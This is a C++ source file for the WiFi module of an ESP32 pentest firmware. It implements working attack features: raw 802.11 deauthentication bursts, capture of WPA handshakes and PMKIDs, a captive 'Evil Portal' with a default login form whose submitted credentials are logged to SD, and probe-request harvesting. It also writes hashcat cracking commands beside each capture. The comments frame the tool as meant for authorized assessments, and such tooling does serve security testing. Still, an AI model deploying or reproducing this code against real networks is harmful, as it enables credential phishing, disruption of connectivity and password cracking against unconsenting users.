#include "Wifi.h"
#include "../../core/ModuleRegistry.h"
#include "../../core/Display.h"
#include "../../core/Input.h"
#include "../../core/SdCard.h"
#include "../../core/Config.h"
#include "../../core/Logger.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <FS.h>

// --- Promiscuous capture state (shared with the RX callback) ---------------
static volatile uint32_t g_frames = 0;
static volatile uint32_t g_eapol  = 0;
static File              g_pcap;
static bool              g_eapolOnly = false;

// libpcap global + record headers (little-endian), link type 105 = IEEE802.11.
static void pcapWriteGlobalHeader(File& f) {
    // Write fields explicitly to avoid endian/packing surprises.
    uint32_t magic = 0xa1b2c3d4; f.write((uint8_t*)&magic, 4);
    uint16_t vmaj = 2, vmin = 4;  f.write((uint8_t*)&vmaj, 2); f.write((uint8_t*)&vmin, 2);
    int32_t  tz = 0;              f.write((uint8_t*)&tz, 4);
    uint32_t sig = 0;            f.write((uint8_t*)&sig, 4);
    uint32_t snap = 65535;       f.write((uint8_t*)&snap, 4);
    uint32_t net = 105;          f.write((uint8_t*)&net, 4);
}
static void pcapWriteRecord(File& f, const uint8_t* data, uint32_t len) {
    uint32_t ts_sec  = millis() / 1000;
    uint32_t ts_usec = (millis() % 1000) * 1000;
    f.write((uint8_t*)&ts_sec, 4);
    f.write((uint8_t*)&ts_usec, 4);
    f.write((uint8_t*)&len, 4);     // incl_len
    f.write((uint8_t*)&len, 4);     // orig_len
    f.write(data, len);
}

// Detect an EAPOL frame by scanning for the LLC/SNAP header + 0x888E ethertype.
static bool isEapol(const uint8_t* p, uint32_t n) {
    static const uint8_t sig[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    if (n < sizeof(sig)) return false;
    for (uint32_t i = 0; i + sizeof(sig) <= n && i < 64; ++i)
        if (memcmp(p + i, sig, sizeof(sig)) == 0) return true;
    return false;
}

// Runs in the WiFi task context (not an ISR), so plain SD writes are fine here.
static void promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 4 || len > 2000) return;
    const uint8_t* frame = pkt->payload;

    bool eapol = isEapol(frame, len);
    if (eapol) g_eapol++;
    g_frames++;

    if (g_pcap && (!g_eapolOnly || eapol))
        pcapWriteRecord(g_pcap, frame, len);
}

// --- Evil Portal state -----------------------------------------------------
static WebServer* g_web = nullptr;
static DNSServer* g_dns = nullptr;
static File       g_portalLog;
static String     g_portalTemplate;
static volatile uint32_t g_portalHits = 0;
static volatile uint32_t g_portalSubs = 0;

// ===========================================================================

void WifiModule::enter(Context& ctx) {
    view_ = View::Menu; menuSel_ = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(80);
}

void WifiModule::exit(Context& ctx) {
    stopPromiscuous();
    stopPortal();
    WiFi.mode(WIFI_OFF);
}

bool WifiModule::loop(Context& ctx) {
    switch (view_) {
        case View::Menu:      break;
        case View::Scan:      return loopScan(ctx);
        case View::Sniffer:   return loopSniffer(ctx, /*eapolOnly=*/false);
        case View::Handshake: return loopSniffer(ctx, /*eapolOnly=*/true);
        case View::Deauth:    return loopDeauth(ctx);
        case View::Portal:    return loopPortal(ctx);
        case View::Export:    return loopExport(ctx);
        case View::Probe:     return loopProbe(ctx);
    }

    static const char* items[] = {"Scan APs", "Sniffer (pcap)",
                                  "Handshake capture", "Targeted deauth",
                                  "Evil Portal", "Verify capture", "Probe harvest"};
    const int N = 7;
    ctx.display->list(items, N, menuSel_, "WiFi", "Enter=open  Esc=back");

    KeyEvent e = ctx.input->poll();
    switch (e.key) {
        case Key::Up:   menuSel_ = (menuSel_ + N - 1) % N; break;
        case Key::Down: menuSel_ = (menuSel_ + 1) % N; break;
        case Key::Back: return false;
        case Key::Enter:
            if (menuSel_ == 0)      { doScan(ctx); view_ = View::Scan; }
            else if (menuSel_ == 1) { if (startPromiscuous(ctx, false)) view_ = View::Sniffer; }
            else if (menuSel_ == 2) { if (startPromiscuous(ctx, true))  view_ = View::Handshake; }
            else if (menuSel_ == 3) { view_ = View::Deauth; }
            else if (menuSel_ == 4) { if (startPortal(ctx)) view_ = View::Portal; }
            else if (menuSel_ == 5) { view_ = View::Export; }
            else if (menuSel_ == 6) { startProbe(ctx); view_ = View::Probe; }
            break;
        default: break;
    }
    delay(10);
    return true;
}

// --- Scan ------------------------------------------------------------------
// Non-blocking, continuously-refreshing scrollable AP list. Open networks are
// flagged red. Enter sets the channel used by handshake capture / deauth.
void WifiModule::doScan(Context& ctx) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    WiFi.scanNetworks(true, true);   // async, include hidden
    scanSel_ = 0;
}

bool WifiModule::loopScan(Context& ctx) {
    int st = WiFi.scanComplete();
    if (st >= 0) {                                   // results ready
        aps_.clear();
        for (int i = 0; i < st; ++i) {
            Ap ap; ap.ssid = WiFi.SSID(i); memcpy(ap.bssid, WiFi.BSSID(i), 6);
            ap.rssi = WiFi.RSSI(i); ap.ch = WiFi.channel(i);
            ap.enc = (uint8_t)WiFi.encryptionType(i);
            aps_.push_back(ap);
        }
        WiFi.scanDelete();
        WiFi.scanNetworks(true, true);               // kick a fresh sweep
    } else if (st == WIFI_SCAN_FAILED) {
        WiFi.scanNetworks(true, true);
    }
    bool scanning = (WiFi.scanComplete() == WIFI_SCAN_RUNNING);
    if (scanSel_ >= (int)aps_.size()) scanSel_ = aps_.empty() ? 0 : (int)aps_.size() - 1;

    ctx.display->clear();
    char title[28];
    snprintf(title, sizeof(title), "WiFi  %d AP%s", (int)aps_.size(), scanning ? "  ." : "");
    ctx.display->header(title);
    if (aps_.empty()) {
        ctx.display->line(0, scanning ? "scanning..." : "no APs found", 0x8410);
    } else {
        int rows = ctx.display->bodyRows();
        int first = scanSel_ >= rows ? scanSel_ - rows + 1 : 0;
        for (int r = 0; r < rows && (first + r) < (int)aps_.size(); ++r) {
            int i = first + r; const Ap& a = aps_[i]; bool s = (i == scanSel_);
            String name = a.ssid.length() ? a.ssid : String("<hidden>");
            if (name.length() > 13) name = name.substring(0, 13);
            char buf[48];
            snprintf(buf, sizeof(buf), "%s%-13s c%-2u %d",
                     s ? ">" : " ", name.c_str(), a.ch, (int)a.rssi);
            uint16_t col = s ? 0xFFE0 : (a.enc == WIFI_AUTH_OPEN ? 0xF800 : 0xFFFF);
            ctx.display->line(r, buf, col);
        }
    }
    ctx.display->footer("Up/Dn  Enter=set ch  Esc=back");

    KeyEvent e = ctx.input->poll();
    switch (e.key) {
        case Key::Up:   if (scanSel_ > 0) scanSel_--; break;
        case Key::Down: if (scanSel_ < (int)aps_.size() - 1) scanSel_++; break;
        case Key::Enter:
            if (!aps_.empty()) { channel_ = aps_[scanSel_].ch;
                if (ctx.log) ctx.log->info("Capture channel set to %u", channel_); }
            break;
        case Key::Back: WiFi.scanDelete(); view_ = View::Menu; break;
        default: break;
    }
    delay(10); return true;
}

// --- Sniffer / Handshake (promiscuous) -------------------------------------
bool WifiModule::startPromiscuous(Context& ctx, bool eapolOnly) {
    g_frames = 0; g_eapol = 0; g_eapolOnly = eapolOnly;
    const char* prefix = eapolOnly ? "handshake" : "sniff";
    g_pcap = ctx.sd->openCapture(prefix, "pcap");
    if (g_pcap) pcapWriteGlobalHeader(g_pcap);

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousCb);
    esp_wifi_set_channel(channel_, WIFI_SECOND_CHAN_NONE);
    if (ctx.log) ctx.log->info("Promiscuous start (ch %u, %s)", channel_,
                               eapolOnly ? "EAPOL" : "all");
    return true;
}

void WifiModule::stopPromiscuous() {
    esp_wifi_set_promiscuous(false);
    if (g_pcap) { g_pcap.flush(); g_pcap.close(); }
}

bool WifiModule::loopSniffer(Context& ctx, bool eapolOnly) {
    // General sniffer hops channels; handshake capture stays on the target ch.
    static uint32_t lastHop = 0;
    if (!eapolOnly && millis() - lastHop > 350) {
        lastHop = millis();
        channel_ = (channel_ % 13) + 1;
        esp_wifi_set_channel(channel_, WIFI_SECOND_CHAN_NONE);
    }

    if (millis() - lastUiMs_ > 300) {
        lastUiMs_ = millis();
        ctx.display->clear();
        ctx.display->header(eapolOnly ? "Handshake capture" : "WiFi Sniffer");
        ctx.display->printf(0, 0xFFFF, "Frames: %lu", (unsigned long)g_frames);
        ctx.display->printf(1, 0x07E0, "EAPOL:  %lu", (unsigned long)g_eapol);
        ctx.display->printf(2, 0x8410, "Channel: %u", channel_);
        ctx.display->printf(3, 0x8410, "pcap: %s", g_pcap ? "writing" : "no SD");
        if (eapolOnly)
            ctx.display->line(4, "Waiting for a reauth...", 0x8410);
        ctx.display->footer("Esc=stop & save");
    }

    if (ctx.input->poll().key == Key::Back) {
        stopPromiscuous();
        if (ctx.log) ctx.log->info("Capture stopped: %lu frames, %lu EAPOL",
                                   (unsigned long)g_frames, (unsigned long)g_eapol);
        view_ = View::Menu;
    }
    return true;
}

// --- Evil Portal -----------------------------------------------------------
// Serves an operator-supplied HTML template from the SD card as a captive
// portal and logs submitted form fields to the SD card. The template is YOURS
// to provide (wifi.portal_template); the firmware ships no brand spoof. For
// authorized social-engineering assessments with written scope only.
static void portalHandleRoot() {
    g_portalHits++;
    g_web->send(200, "text/html", g_portalTemplate);
}
static void portalHandleSubmit() {
    g_portalSubs++;
    if (g_portalLog) {
        g_portalLog.printf("[%lu] submit", (unsigned long)millis());
        for (int i = 0; i < g_web->args(); ++i)
            g_portalLog.printf(" %s=%s", g_web->argName(i).c_str(), g_web->arg(i).c_str());
        g_portalLog.println();
        g_portalLog.flush();
    }
    g_web->send(200, "text/html",
        "<html><body>Thanks. Please wait...</body></html>");
}

bool WifiModule::startPortal(Context& ctx) {
    String ssid = ctx.config->getString("wifi.portal_ssid", "Free_WiFi");
    String tpl  = ctx.config->getString("wifi.portal_template", "/huginn/portal/index.html");

    g_portalTemplate = "";
    if (ctx.sd && ctx.sd->exists(tpl.c_str())) {
        File f = ctx.sd->fs().open(tpl.c_str(), FILE_READ);
        while (f && f.available()) g_portalTemplate += (char)f.read();
        if (f) f.close();
    }
    if (g_portalTemplate.length() == 0) {
        // Neutral default — a generic notice, not an impersonation of any brand.
        g_portalTemplate =
            "<html><head><meta name=viewport content='width=device-width'></head>"
            "<body><h3>Network sign-in</h3>"
            "<form method=POST action=/submit>"
            "User <input name=user><br>Pass <input name=pass type=password><br>"
            "<button>Connect</button></form></body></html>";
    }

    g_portalHits = 0; g_portalSubs = 0;
    g_portalLog = ctx.sd ? ctx.sd->openCapture("portal", "log") : File();

    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid.c_str());
    IPAddress ip = WiFi.softAPIP();

    g_dns = new DNSServer();
    g_dns->start(53, "*", ip);          // catch-all DNS -> portal

    g_web = new WebServer(80);
    g_web->on("/", portalHandleRoot);
    g_web->on("/submit", HTTP_POST, portalHandleSubmit);
    g_web->onNotFound(portalHandleRoot); // captive redirect
    g_web->begin();

    if (ctx.log) ctx.log->tx("wifi", "evil portal up: SSID='%s'", ssid.c_str());
    return true;
}

void WifiModule::stopPortal() {
    if (g_web) { g_web->stop(); delete g_web; g_web = nullptr; }
    if (g_dns) { g_dns->stop(); delete g_dns; g_dns = nullptr; }
    if (g_portalLog) { g_portalLog.flush(); g_portalLog.close(); }
    WiFi.softAPdisconnect(true);
}

bool WifiModule::loopPortal(Context& ctx) {
    if (g_dns) g_dns->processNextRequest();
    if (g_web) g_web->handleClient();

    if (millis() - lastUiMs_ > 400) {
        lastUiMs_ = millis();
        ctx.display->clear(); ctx.display->header("Evil Portal");
        ctx.display->printf(0, 0xFFFF, "SSID: %s",
            ctx.config->getString("wifi.portal_ssid", "Free_WiFi").c_str());
        ctx.display->printf(1, 0x07E0, "Page hits: %lu", (unsigned long)g_portalHits);
        ctx.display->printf(2, 0xFFE0, "Submissions: %lu", (unsigned long)g_portalSubs);
        ctx.display->line(4, "Logged to SD captures/", 0x8410);
        ctx.display->footer("Esc=stop");
    }

    if (ctx.input->poll().key == Key::Back) { stopPortal(); view_ = View::Menu; }
    return true;
}

// --- Targeted deauth -------------------------------------------------------
// Scoped to the ONE AP selected from the scan list, a bounded burst per press,
// every burst logged. This is the authorized reauth-capture aid, not a flood:
// there is no "all APs" mode, and the per-press count is hard-capped.
// (RF/WiFi jammers and indiscriminate "deauth everything" are intentionally
// absent — they only work by disrupting bystanders.)
void WifiModule::sendDeauthBurst(Context& ctx, const Ap& ap) {
    uint32_t burst = ctx.config->getInt("wifi.deauth_burst", 32);
    if (burst > 128) burst = 128;               // hard cap

    // 802.11 deauth: FC=0xC0, to broadcast, from/for the selected BSSID only.
    uint8_t f[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,           // addr1 DA (this BSSID's clients)
        0,0,0,0,0,0,                            // addr2 SA = BSSID
        0,0,0,0,0,0,                            // addr3 BSSID
        0x00, 0x00,                             // seq
        0x07, 0x00                              // reason: class-3 frame
    };
    memcpy(f + 10, ap.bssid, 6);
    memcpy(f + 16, ap.bssid, 6);

    WiFi.mode(WIFI_STA);                        // ensure the radio is started
    esp_wifi_set_promiscuous(true);             // allow raw 802.11 tx
    esp_wifi_set_channel(ap.ch, WIFI_SECOND_CHAN_NONE);
    for (uint32_t i = 0; i < burst; ++i) {
        esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
        deauthSent_++;
        delay(2);
    }
    esp_wifi_set_promiscuous(false);

    if (ctx.log) ctx.log->tx("wifi", "deauth burst x%lu -> %02X:%02X:%02X:%02X:%02X:%02X ch%u",
        (unsigned long)burst, ap.bssid[0],ap.bssid[1],ap.bssid[2],
        ap.bssid[3],ap.bssid[4],ap.bssid[5], ap.ch);
}

bool WifiModule::loopDeauth(Context& ctx) {
    if (aps_.empty()) {
        ctx.display->clear(); ctx.display->header("Targeted deauth");
        ctx.display->line(0, "Run a Scan first to", 0xFFE0);
        ctx.display->line(1, "pick a single target.", 0xFFFF);
        ctx.display->footer("Esc=back");
        if (ctx.input->poll().key == Key::Back) view_ = View::Menu;
        delay(20); return true;
    }
    const Ap& a = aps_[scanSel_];
    ctx.display->clear(); ctx.display->header("Targeted deauth");
    ctx.display->printf(0, 0xFFFF, "Target: %s", a.ssid.length()?a.ssid.c_str():"<hidden>");
    ctx.display->printf(1, 0x8410, "%02X:%02X:%02X:%02X:%02X:%02X ch%u",
        a.bssid[0],a.bssid[1],a.bssid[2],a.bssid[3],a.bssid[4],a.bssid[5], a.ch);
    ctx.display->printf(2, 0x07E0, "Frames sent: %lu", (unsigned long)deauthSent_);
    ctx.display->line(4, "Up/Dn=pick  Enter=1 burst", 0xFFE0);
    ctx.display->footer("Esc=back (authorized target only)");

    KeyEvent e = ctx.input->poll();
    switch (e.key) {
        case Key::Up:   scanSel_ = (scanSel_ + aps_.size() - 1) % aps_.size(); break;
        case Key::Down: scanSel_ = (scanSel_ + 1) % aps_.size(); break;
        case Key::Enter: sendDeauthBurst(ctx, a); break;
        case Key::Back:  view_ = View::Menu; break;
        default: break;
    }
    delay(10); return true;
}

// --- Verify capture --------------------------------------------------------
// On-device hc22000 generation from raw 802.11 is fiddly and easy to get wrong,
// so this verifies the latest capture (EAPOL / PMKID present?) and writes the
// exact PC conversion recipe next to it. Convert on a workstation with:
//   hcxpcapngtool -o out.hc22000 <capture>.pcap   then  hashcat -m 22000 ...
static int g_exportResult = -2;   // -2 = not run yet
static String g_exportMsg;

int WifiModule::exportHandshakes(Context& ctx) {
    if (!ctx.sd || !ctx.sd->mounted()) { g_exportMsg = "No SD"; return -1; }
    // Find the newest handshake_*.pcap (fall back to sniff_*.pcap).
    File dir = ctx.sd->fs().open("/huginn/captures");
    String best;
    for (File e = dir.openNextFile(); e; e = dir.openNextFile()) {
        String n = e.name();                       // may be full path on some cores
        int sl = n.lastIndexOf('/'); if (sl >= 0) n = n.substring(sl + 1);
        if (n.endsWith(".pcap") && (n.indexOf("handshake") >= 0 || n.indexOf("sniff") >= 0))
            if (n > best) best = n;        // lexical max ~ newest (zero-padded seq)
        e.close();
    }
    if (dir) dir.close();
    if (best.length() == 0) { g_exportMsg = "No capture files"; return -1; }

    String path = String("/huginn/captures/") + best;
    File f = ctx.sd->fs().open(path.c_str(), FILE_READ);
    if (!f) { g_exportMsg = "Open failed"; return -1; }

    uint8_t gh[24];
    f.read(gh, 24);                        // skip pcap global header
    uint32_t eapol = 0, pmkid = 0, frames = 0;
    static const uint8_t eapolSig[] = {0x88,0x8E};
    static const uint8_t pmkidSig[] = {0x00,0x0F,0xAC,0x04};
    uint8_t buf[2048];
    while (f.available() >= 16) {
        uint8_t rh[16]; f.read(rh, 16);
        uint32_t incl = rh[8] | (rh[9]<<8) | (rh[10]<<16) | ((uint32_t)rh[11]<<24);
        if (incl == 0 || incl > sizeof(buf)) break;
        int got = f.read(buf, incl);
        if (got <= 0) break;
        frames++;
        for (int i = 0; i + 2 <= got && i < 64; ++i)
            if (buf[i]==eapolSig[0] && buf[i+1]==eapolSig[1]) { eapol++; break; }
        for (int i = 0; i + 4 <= got; ++i)
            if (!memcmp(buf+i, pmkidSig, 4)) { pmkid++; break; }
    }
    f.close();

    // Write the conversion recipe next to the capture.
    String recipe = path; recipe.replace(".pcap", ".hc22000.txt");
    File rf = ctx.sd->fs().open(recipe.c_str(), FILE_WRITE);
    if (rf) {
        rf.printf("Capture: %s\nFrames:%lu EAPOL:%lu PMKID-KDE:%lu\n\n",
                  path.c_str(), (unsigned long)frames, (unsigned long)eapol,
                  (unsigned long)pmkid);
        rf.println("Convert on a workstation, then crack:");
        rf.printf("  hcxpcapngtool -o %s.hc22000 %s\n", best.c_str(), best.c_str());
        rf.println("  hashcat -m 22000 <file>.hc22000 <wordlist>");
        rf.close();
    }
    g_exportMsg = String("EAPOL ") + eapol + "  PMKID " + pmkid;
    return (int)eapol;
}

bool WifiModule::loopExport(Context& ctx) {
    if (g_exportResult == -2) g_exportResult = exportHandshakes(ctx);
    ctx.display->clear(); ctx.display->header("Verify capture");
    if (g_exportResult < 0) {
        ctx.display->line(0, g_exportMsg.c_str(), 0xF800);
    } else {
        ctx.display->line(0, "Latest capture checked:", 0x07E0);
        ctx.display->line(1, g_exportMsg.c_str(), 0xFFFF);
        ctx.display->line(2, g_exportResult ? "Handshake/PMKID present" : "No EAPOL found", 0xFFE0);
        ctx.display->line(3, "Recipe written (.hc22000.txt)", 0x8410);
        ctx.display->line(4, "Convert w/ hcxpcapngtool on PC", 0x8410);
    }
    ctx.display->footer("Esc=back");
    if (ctx.input->poll().key == Key::Back) { g_exportResult = -2; view_ = View::Menu; }
    delay(20); return true;
}

// --- Probe-request SSID harvest --------------------------------------------
// Phones periodically broadcast directed probe requests naming networks they
// remember. Collecting those SSIDs reveals the networks a nearby device has
// joined before — useful recon (and a reminder to turn off auto-join). Passive.
struct ProbeSsid { char ssid[33]; uint16_t count; };
static ProbeSsid g_probes[128];
static volatile int g_probeN = 0;

static void probeCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    auto* p = (wifi_promiscuous_pkt_t*)buf;
    int len = p->rx_ctrl.sig_len;
    const uint8_t* f = p->payload;
    if (len < 26) return;
    if (f[0] != 0x40) return;                 // frame control: probe request
    const uint8_t* tag = f + 24;              // tagged params follow the header
    if (tag + 2 > f + len) return;
    if (tag[0] != 0x00) return;               // element 0 = SSID
    int slen = tag[1];
    if (slen <= 0 || slen > 32) return;       // skip wildcard / broadcast probes
    if (tag + 2 + slen > f + len) return;
    char ssid[33];
    for (int i = 0; i < slen; ++i) {
        uint8_t c = tag[2 + i];
        if (c < 32 || c > 126) return;        // printable only
        ssid[i] = (char)c;
    }
    ssid[slen] = 0;
    for (int i = 0; i < g_probeN; ++i)
        if (strcmp(g_probes[i].ssid, ssid) == 0) { g_probes[i].count++; return; }
    if (g_probeN < 128) {
        strncpy(g_probes[g_probeN].ssid, ssid, sizeof(g_probes[0].ssid));
        g_probes[g_probeN].ssid[32] = 0;
        g_probes[g_probeN].count = 1;
        g_probeN++;
    }
}

void WifiModule::startProbe(Context& ctx) {
    g_probeN = 0; probeSel_ = 0;
    WiFi.mode(WIFI_STA); WiFi.disconnect(true);
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;   // management frames only
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&probeCb);
    esp_wifi_set_channel(channel_, WIFI_SECOND_CHAN_NONE);
    if (ctx.log) ctx.log->info("Probe harvest started");
}

void WifiModule::stopProbe(Context& ctx) {
    esp_wifi_set_promiscuous(false);
    // Restore the default (all) filter for other promiscuous uses.
    wifi_promiscuous_filter_t all;
    all.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_filter(&all);
    // Save what we collected.
    if (ctx.sd) {
        File f = ctx.sd->openCapture("probes", "csv");
        if (f) {
            f.println("ssid,count");
            for (int i = 0; i < g_probeN; ++i)
                f.printf("\"%s\",%u\n", g_probes[i].ssid, g_probes[i].count);
            f.close();
        }
    }
    if (ctx.log) ctx.log->info("Probe harvest: %d unique SSIDs", g_probeN);
}

bool WifiModule::loopProbe(Context& ctx) {
    static uint32_t lastHop = 0;
    if (millis() - lastHop > 300) {
        lastHop = millis();
        channel_ = (channel_ % 13) + 1;
        esp_wifi_set_channel(channel_, WIFI_SECOND_CHAN_NONE);
    }

    if (millis() - lastUiMs_ > 350) {
        lastUiMs_ = millis();
        int n = g_probeN;
        if (probeSel_ >= n) probeSel_ = n > 0 ? n - 1 : 0;
        ctx.display->clear(); ctx.display->header("Probe harvest");
        ctx.display->printf(0, 0xFFFF, "SSIDs: %d  (ch%u)", n, channel_);
        int rows = ctx.display->bodyRows() - 2;
        int first = probeSel_ >= rows ? probeSel_ - rows + 1 : 0;
        for (int r = 0; r < rows && (first + r) < n; ++r) {
            int i = first + r; bool s = (i == probeSel_);
            char line[40];
            snprintf(line, sizeof(line), "%s %s (x%u)", s ? ">" : " ",
                     g_probes[i].ssid, g_probes[i].count);
            ctx.display->line(1 + r, line, s ? 0xFFE0 : 0xFFFF);
        }
        ctx.display->footer("Up/Dn  Esc=stop & save");
    }

    KeyEvent e = ctx.input->poll();
    switch (e.key) {
        case Key::Up:   if (probeSel_ > 0) probeSel_--; break;
        case Key::Down: if (probeSel_ < g_probeN - 1) probeSel_++; break;
        case Key::Back: stopProbe(ctx); view_ = View::Menu; break;
        default: break;
    }
    delay(5);
    return true;
}

REGISTER_MODULE(WifiModule);
